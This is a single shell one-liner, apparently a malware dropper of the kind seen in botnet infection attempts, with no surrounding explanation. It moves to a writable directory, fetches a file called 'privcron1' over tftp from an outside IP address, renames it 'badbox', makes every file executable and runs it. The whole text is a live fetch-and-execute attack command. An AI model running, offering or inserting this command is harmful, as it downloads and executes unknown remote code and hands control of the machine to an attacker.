cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privcron1 -g 107.174.34.67;cat privcron1 >badbox;chmod +x *;./badbox
